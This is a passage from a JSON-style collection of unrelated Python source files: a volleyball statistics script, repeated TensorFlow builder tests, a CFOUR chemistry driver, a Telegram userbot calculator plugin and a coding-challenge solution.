\uacf5\uaca9\")\njust_next.print_overall_effect(prefix=\"\ub118\uc5b4\uc628 \uacf5 \uacf5\uaca9\")\n", "268": "from volleyball.stat.StatMaker import *\nfrom typing import List\nfrom openpyxl import Workbook\n\nstat_file = StatFile(\"C:\\\\Users\\\\jsmoo\\\\OneDrive\\\\\ubc14\ud0d5 \ud654\uba74\\\\\ubc30\uad6c\", [\"\uc5ec\uc790\ubd80\"], [2021], list(range(1, 300)))\nstat_file.fill_games()\nstat_file.fill_sets()\nstat_file.fill_messages()\nstat_file.fill_rallies()\nstat_file.fill_chances()\n\nhome_team_receives : Dict[str, EffCalc] = {}\n\naway_team_receives : Dict[str, EffCalc] = {}\n\nhome_team_serves : Dict[str, EffCalc] = {}\n\naway_team_serves : Dict[str, EffCalc] = {}\n\nhome_team_attacks : Dict[str, EffCalc] = {}\n\naway_team_attacks : Dict[str, EffCalc] = {}\n\n\nclass PlayerWithSetNum(Player):\n\n    def __init__(self, set_num: int, name: str, back_num: int, season: int, team: str):\n        super().__init__(name, back_num, season, team)\n        self.set_num = set_num\n\n\ndef put_action_message_to_action(messages: List[Messages], game: Game, set_in_game: Set, action: str, home_eff_calc: Dict[str, EffCalc], away_eff_calc: Dict[str, EffCalc]):\n    for message in messages[0].select_messages_with_action(action):\n        home_team = game.teams[0]\n        if home_team not in list(home_eff_calc.keys()):\n            home_eff_calc[home_team] = EffCalc({})\n            home_eff_calc[home_team].append_effect_calc(Messages([message]), game, action, PlayerWithSetNum, set_in_game.index + 1)\n        else:\n            home_eff_calc[home_team].append_effect_calc(Messages([message]), game, action, PlayerWithSetNum, set_in_game.index + 1)\n\n    for message in messages[1].select_messages_with_action(action):\n        home_team = game.teams[0]\n        if home_team not in list(away_eff_calc.keys()):\n            away_eff_calc[home_team] = EffCalc({})\n            away_eff_calc[home_team].append_effect_calc(Messages([message]), game, action, PlayerWithSetNum, set_in_game.index + 1)\n        else:\n            away_eff_calc[home_team].append_effect_calc(Messages([message]), game, action, PlayerWithSetNum, set_in_game.index + 1)\n\n\ndef processor_in_set(messages: List[Messages], chances: Chances, rallies: Rallies, game: Game, set_in_game: Set):\n    for rally in rallies:\n        chances_in_rally = []\n        for index in range(rally.message_index[0], rally.message_index[1] + 1):\n            chance = chances.select_chance_with_message_index(index)\n            if chance not in chances_in_rally:\n                chances_in_rally.append(chance)\n\n    actions_home_away = [\n        [\"\ub9ac\uc2dc\ube0c\", home_team_receives, away_team_receives],\n        [\"\uc11c\ube0c\", home_team_serves, away_team_serves],\n        [\"\uacf5\uaca9\uc885\ud569\", home_team_attacks, away_team_attacks]\n    ]\n\n    for action_home_away in actions_home_away:\n        put_action_message_to_action(messages, game, set_in_game, action_home_away[0], action_home_away[1], action_home_away[2])\n\n\nstat_file.process_in_set(processor_in_set)\n\n\nfor team, eff_calc in list(home_team_serves.items()):\n    eff_calc: EffCalc\n    eff_calc.print_overall_effect(prefix=team + \" \uc11c\ube0c\")\n\nprint(\"-\" * 50)\n\nfor team, eff_calc in list(away_team_serves.items()):\n    eff_calc: EffCalc\n    eff_calc.print_overall_effect(prefix=team + \" \uc11c\ube0c\")\n\nprint(\"-\" * 50)\n\nfor team, eff_calc in list(home_team_receives.items()):\n    eff_calc: EffCalc\n    eff_calc.print_overall_effect(prefix=team + \" \ub9ac\uc2dc\ube0c\")\n\nprint(\"-\" * 50)\n\nfor team, eff_calc in list(away_team_receives.items()):\n    eff_calc: EffCalc\n    eff_calc.print_overall_effect(prefix=team + \" \ub9ac\uc2dc\ube0c\")\n\nprint(\"-\" * 50)\n\nfor team, eff_calc in list(home_team_attacks.items()):\n    eff_calc: EffCalc\n    eff_calc.print_overall_effect(prefix=team + \" \uacf5\uaca9\")\n\nprint(\"-\" * 50)\n\nfor team, eff_calc in list(away_team_receives.items()):\n    eff_calc: EffCalc\n    eff_calc.print_overall_effect(prefix=team + \" \uacf5\uaca9\")\n", "269": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "270": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "271": "\"\"\"\ncfour_driver.py\n\nThe main driver for cfour_viewer.\n\nThis should be set up so that cfour_driver.py can be\ncalled and we can run the program in interactive mode.\n\"\"\"\n\nfrom cfour_viewer import abinitio_directories as ad\nfrom cfour_viewer import cfour_run as cr\nfrom cfour_viewer import cfour_parse as cp\nfrom cfour_viewer.routines import read_json, get_calc_path, save_json, atoms_from_zmat\nfrom cfour_viewer import isotopes\nfrom cfour_viewer import cfour_freq as cf\nfrom cfour_viewer import html_template as ht\nimport subprocess\nimport json\nimport pandas as pd\nfrom pprint import pprint\nfrom glob import glob\nimport os\nimport shutil\nimport sys\n\ndef setup_calc(mode=\"test\"):\n    \"\"\"\n    The workflow is as follows:\n    1. Read in the global settings\n    2. Generate the next calculation folder in the outputdir defined in settings\n    3. Generate the file structure within the calcID folder\n    \"\"\"\n    # this gets the path to where the script lives\n    script_path = os.path.dirname(os.path.realpath(__file__))\n    cwd = os.getcwd()\n    # read in the settings file which lives with the script\n    with open(script_path + \"/settings.json\") as open_json:\n        settings = json.load(open_json)\n    os.chdir(settings[\"output_dir\"])\n    # Generate the next in a chain of calculation IDs\n    calcID = ad.generate_folder()\n    # Set up where the folders will live\n    settings[\"calc_dir\"] = settings[\"output_dir\"] + \"/\" + str(calcID) + \"/calcs\"\n    settings[\"json_dir\"] = settings[\"output_dir\"] + \"/\" + str(calcID) + \"/json\"\n    settings[\"figs_dir\"] = settings[\"output_dir\"] + \"/\" + str(calcID) + \"/figures\"\n    settings[\"docs_dur\"] = settings[\"output_dir\"] + \"/\" + str(calcID) + \"/docs\"\n    os.chdir(settings[\"output_dir\"] + \"/\" + str(calcID))\n    # Set up the file structure\n    ad.setup_folders()\n    shutil.copy2(cwd + \"/ZMAT\", settings[\"calc_dir\"] + \"/ZMAT\")\n    # Initialise an instance of CFOUR calculation\n    calculation = cr.cfour_instance(\n        calcID=calcID,\n        settings=settings,\n        mode=mode\n    )\n    calculation.run_calc()\n    print(\"Calculation ID: \" + str(calcID))\n\ndef parse_calc(calcID, print_dict=True):\n    print(\"Parsing Calculation ID: \" + str(calcID))\n    script_path = os.path.dirname(os.path.realpath(__file__))\n    cwd = os.getcwd()\n    with open(script_path + \"/settings.json\") as open_json:\n        settings = json.load(open_json)\n    os.chdir(settings[\"output_dir\"] + \"/\" + str(calcID))\n    settings[\"calcID_dir\"] = settings[\"output_dir\"] + \"/\" + str(calcID)\n    output_instance = cp.OutputFile(\n        settings[\"calcID_dir\"] + \"/calcs/calc\" + str(calcID) + \".log\"\n    )\n    output_instance.export_xyz()\n    if print_dict is True:\n        pprint(output_instance.InfoDict)\n    else:\n        return output_instance.InfoDict\n\ndef copy_zmat(calcID):\n    cwd = os.getcwd()\n    calc_path = get_calc_path(calcID)\n    results_json_path = calc_path + \"/json/calc\" + str(calcID) + \\\n    \".results.json\"\n    if os.path.isfile(results_json_path) is True:\n        pass                                # do nothing\n    else:                                        # parse the calc if it\n        parse_calc(calcID)                       # hasn't been done yet\n    results_dict = read_json(results_json_path)  # read in the results\n    if len(results_dict[\"final zmat\"]) < 2:\n        print(\"Copying unoptimized ZMAT\")\n        target_zmat = \"input zmat\"               # if we don't optimise, we\n    else:                                        # don't get a new ZMAT so we'll\n        target_zmat = \"final zmat\"               # use the initial one\n        print(\"Copying optimized ZMAT\")\n    if os.path.isfile(\"./ZMAT\") is True:\n        shutil.copy2(\"./ZMAT\", \"./ZMATold\")\n    with open(\"./ZMAT\", \"w+\") as WriteFile:\n        # Flatten the list holding the new ZMAT\n        WriteFile.write(\n        \"\".join(results_dict[target_zmat])\n        )\n\ndef harm_findif():\n    \"\"\"\n    The workflow is as follows:\n    1. Read in the global settings\n    2. Generate the next calculation folder in the outputdir defined in settings\n    3. Generate the file structure within the calcID folder\n    \"\"\"\n    # this gets the path to where the script lives\n    script_path = os.path.dirname(os.path.realpath(__file__))\n    cwd = os.getcwd()\n    # read in the settings file which lives with the script\n    with open(script_path + \"/settings.json\") as open_json:\n        settings = json.load(open_json)\n    os.chdir(settings[\"output_dir\"])\n    # Generate the next in a chain of calculation IDs\n    calcID = ad.generate_folder()\n    # Set up where the folders will live\n    settings[\"calc_dir\"] = settings[\"output_dir\"] + \"/\" + str(calcID) + \"/calcs\"\n    settings[\"json_dir\"] = settings[\"output_dir\"] + \"/\" + str(calcID) + \"/json\"\n    settings[\"figs_dir\"] = settings[\"output_dir\"] + \"/\" + str(calcID) + \"/figures\"\n    settings[\"docs_dur\"] = settings[\"output_dir\"] + \"/\" + str(calcID) + \"/docs\"\n    os.chdir(settings[\"output_dir\"] + \"/\" + str(calcID))\n    # Set up the file structure\n    ad.setup_folders()\n    shutil.copy2(cwd + \"/ZMAT\", settings[\"calc_dir\"] + \"/ZMAT\")\n    # Initialise an instance of CFOUR calculation\n    calculation = cr.cfour_instance(\n        calcID=calcID,\n        settings=settings,\n        mode=None\n    )\n    calculation.findif_freq()\n    print(\"Setup harmonic calculation by fin.diff. ID: \" + str(calcID))\n\ndef analyse_freq_output(calcID):\n    cwd = os.getcwd()\n    calc_path = get_calc_path(calcID)\n    os.chdir(calc_path + \"/calcs\")\n    freq_dict = cf.analyse_harmonic()\n    freq_dict = cp.external_parse(calc_path + \"/calcs/freq/FREQ_OUTPUT\")\n    save_json(calc_path + \"/json/calc\" + str(calcID) + \".results.json\",\n              freq_dict\n              )\n    pprint(freq_dict)\n\ndef harmfreq_isotopes(calcID):\n    \"\"\" Generates all isotopologues, and produces their spectroscopic constants.\n        The threshold for \"relevance\" is set as a percentage in abundance,\n        although some atoms (e.g. deuterium, 18-oxygen) are commonly used in\n        substitution studies and are included.\n    \"\"\"\n    calc_path = get_calc_path(calcID)\n    json_path = calc_path + \"/json/calc\" + str(calcID) + \".results.json\"\n\n    # Pre-flight check: see if the harmonic frequency output has been analysed\n    if os.path.isfile(json_path) is False:\n        raise FileNotFoundError(\"Frequency JSON file does not exist. Run analysis scripts!\")\n\n    freq_path = calc_path + \"/calcs/freq/\"\n    # Get list of all the output files from the frequency analysis\n    freq_filelist = glob(freq_path + \"*\")\n    freq_filelist = [files for files in freq_filelist if os.path.isfile(files) is True]\n    analysis_dict = dict()\n\n    # Generate list of atoms from the ZMAT file - this preserves the ordering of atoms\n    atom_list = atoms_from_zmat(freq_path + \"ZMAT\")\n    atom_list = [atom for atom in atom_list if atom != \"X\"]\n    print(\"Atoms in ZMAT: \" + str(atom_list))\n    os.chdir(freq_path)\n    # Call function to generate all isotopologues and their masses\n    isotopologue_dict = isotopes.isotope_combinations(atom_list)\n    for isotopologue in isotopologue_dict:\n        # Molecular formula for the isotopologue\n        name = \"\".join(isotopologue)\n        if os.path.isdir(name) is True:\n            # Clean up previous analysis\n            shutil.rmtree(name)\n        # Make a directory for the isotopologue\n        os.mkdir(name)\n        os.chdir(freq_path + name)\n        for files in freq_filelist:\n            shutil.copy2(files, os.getcwd(), follow_symlinks=False)\n        # Write the non-standard masses to file for CFOUR to work on\n        with open(\"ISOMASS\", \"w+\") as write_file:\n            for mass in isotopologue_dict[isotopologue]:\n                write_file.write(str(mass) + \"\\n\")\n        with open(calc_path + \"/docs/\" + name + \".freq\", \"w+\") as write_file:\n            # Run xjoda to process the frequency information\n            process = subprocess.Popen(\"xjoda\", stdout=write_file, stderr=write_file)\n            process.wait()\n        # Parse the output of the analysis\n        freq_output = cp.external_parse(calc_path + \"/docs/\" + name + \".freq\")\n        analysis_dict[name] = dict()\n        analysis_dict[name][\"rotational constants\"] = freq_output[\"rotational constants\"]\n        analysis_dict[name][\"frequencies\"] = freq_output[\"frequencies\"]\n        analysis_dict[name][\"A-reduction CD\"] = freq_output[\"centrifugal distortion\"][\"A\"]\n        analysis_dict[name][\"S-reduction CD\"] = freq_output[\"centrifugal distortion\"][\"S\"]\n        print(\"Completed analysis for \" + name)\n        os.chdir(freq_path)\n    dataframe = pd.DataFrame.from_dict(analysis_dict)\n    dataframe.to_csv(calc_path + \"/docs/isotope_data.csv\")\n\ndef vpt2_findif(calcID):\n    \"\"\" The calcID here points to a frequency calculation that has already\n    completed. The script will then set up the calculations required for the\n    cubic force fields.\n\n    I.e. piggy back this script on a finished harmonic frequency job, where\n    the ZMAT already has the following keywords:\n\n    ANH_ALGORITHM=PARALLEL\n    FREQ_ALGORITHM=PARALLEL\n    FD_PROJECT=OFF\n    VIB=FINDIF\n    ANHARM=VPT2\n    \"\"\"\n    top_dir = os.getcwd()\n    calc_path = get_calc_path(calcID)\n    os.chdir(calc_path + \"/calcs\")\n    if os.path.isdir(\"freq\") is not True:\n        print(\"Harmonic frequency analysis not done yet. Attempting.\")\n        analyse_freq_output(calcID)\n    os.chdir(calc_path + \"/calcs/freq\")\n    os.system(\"rm zmat*\")\n    os.system(\"xcubic\")\n    for freq_calc_zmat in glob(\"zmat*\"):\n        shutil.copy2(freq_calc_zmat, \"ZMAT\")\n        harm_findif()\n\ndef generate_reports(calcIDs):\n    \"\"\" Give a list of calcIDs, and batch generate an HTML report \"\"\"\n    cwd = os.getcwd()\n    json_reports = list()\n    for ID in calcIDs:\n        json_reports.append(parse_calc(ID, print_dict=False))\n    ht.multi_report(cwd + \"/multi_report\", json_reports, calcIDs)\n", "272": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "273": "# https://edabit.com/challenge/iK2F9DNAiTor2wFob\n'''\nTurn each character in a string s into its ASCII character code and join them together to create a number.\n\nFor example, for string \"abc\", the number is 979899. We will call this number \"num1\".\n\n\"abc\" \u279e \"a\" = 97, \"B\" = 98, \"C\" = 99 \u279e 979899\nThen replace any incidence of the number 7 with the number 1, and call this number \"num2\":\n\nnum1 = 979899\n\nnum2 = 919899\nReturn the difference between the sum of the digits in num1 and num2:\n\n  (9 + 7 + 9 + 8 + 9 + 9)\n- (9 + 1 + 9 + 8 + 9 + 9)\n-------------------------\n         \u279e  6\n'''\ndef calc(s):\n    total_of_word=\"+\".join([\"+\".join(str(ord(letter))) for letter in s])\n    mod=\"+\".join([\"+\".join(str(int(str(ord(letter)).replace(\"7\",\"1\")))) for letter in s])\n    return eval(total_of_word)-eval(mod)\n\n# print(calc('ABCDabcd'), 12)\n# print(calc('cdefgh'), 0)\n# print(calc('ifkhchlhfde'), 6)\n# print(calc('aaaaaddddrijkl'), 36)\n# print(calc('abcdefghijklmnopqrstuvwxyz'), 18)\n# print(calc('AABBCC'), 12)\nprint(calc('ABCDEFGH'), 24)\n# print(calc('anmatmudtr'), 18)\n# print(calc('suwvete'), 6)\n# print(calc('edabit'), 6)\n# print(calc('EDABIT'), 6)\n# print(calc('SLOWLLLY'), 36)\n# print(calc('COMEnananan'), 42)\n# print(calc('coupdetat'), 12)\n# print(calc('arsenal'), 12)\n# print(calc('byoaaasglrrsA'), 18)\n# print(calc('byoglrrsA'), 0)\n# print(calc('eyyyhenDDDUEN'), 6)\n# print(calc('ABCDEFGHIJKLMNOPQRSTUVWXYZ'), 78)\n# print(calc('zyxwvutsrqpon'), 6)\n# print(calc('ZYXWVUTSR'), 6)\n", "274": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "275": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "276": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      